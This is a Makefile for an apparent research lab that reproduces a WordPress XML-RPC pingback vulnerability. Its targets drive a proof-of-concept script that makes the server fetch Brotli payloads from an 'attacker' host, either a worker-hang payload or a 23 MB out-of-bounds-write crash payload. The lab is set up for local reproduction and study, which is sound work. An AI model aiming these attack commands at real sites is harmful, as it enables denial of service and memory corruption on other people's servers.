SHELL := /bin/bash
COMPOSE ?= docker compose
-include .env

WP_PORT ?= 8080
ATTACKER_PORT ?= 8081
CHUNK_DELAY ?= 1.0
TARGET ?= http://localhost:$(WP_PORT)
HANG_PAYLOAD ?= http://attacker:8080/small.br
CRASH_PAYLOAD ?= http://attacker:8080/payload.br
POC := python3 poc/pingback_poc.py

.PHONY: help up down reset init probe hang crash logs verify payloads clean

help:
	@echo "brotli-pingback-lab"
	@echo ""
	@echo "  make up          build and start the lab, then install WordPress"
	@echo "  make probe       check xmlrpc.php and pingback.ping"
	@echo "  make hang        send the 86-byte worker-hang payload"
	@echo "  make crash       send the 23 MB OOB-write payload"
	@echo "  make logs        follow php-fpm / nginx logs"
	@echo "  make verify      confirm the PHP/libcurl/Brotli stack is vulnerable"
	@echo "  make down        stop the lab (keeps volumes)"
	@echo "  make reset       stop the lab and delete the database/WordPress volumes"
	@echo ""
	@echo "Variables: TARGET=$(TARGET) HANG_PAYLOAD=$(HANG_PAYLOAD)"
	@echo "           CRASH_PAYLOAD=$(CRASH_PAYLOAD)"

up:
	$(COMPOSE) up -d --build
	$(COMPOSE) run --rm wp-init
	@echo ""
	@echo "[+] WordPress: $(TARGET)"
	@echo "[+] Payload server (host): http://localhost:$(ATTACKER_PORT)/health"
	@echo "[*] Next: make probe"

down:
	$(COMPOSE) down

reset:
	$(COMPOSE) down -v

init:
	$(COMPOSE) run --rm wp-init

probe:
	$(POC) --target $(TARGET) --mode probe

hang:
	$(POC) --target $(TARGET) --mode hang \
		--payload-url $(HANG_PAYLOAD) \
		--workers 4 --count 4 --timeout 25 --show-logs

crash:
	$(POC) --target $(TARGET) --mode crash \
		--payload-url $(CRASH_PAYLOAD) \
		--workers 4 --count 4 --timeout 30 --show-logs

logs:
	$(COMPOSE) logs -f wordpress nginx

verify:
	./scripts/verify-vulnerable.sh

payloads:
	python3 lab/attacker/payload.py hang lab/attacker/hang.br
	python3 lab/attacker/payload.py crash lab/attacker/crash.br

clean:
	rm -f lab/attacker/hang.br lab/attacker/crash.br
	find . -type d -name __pycache__ -prune -exec rm -rf {} +
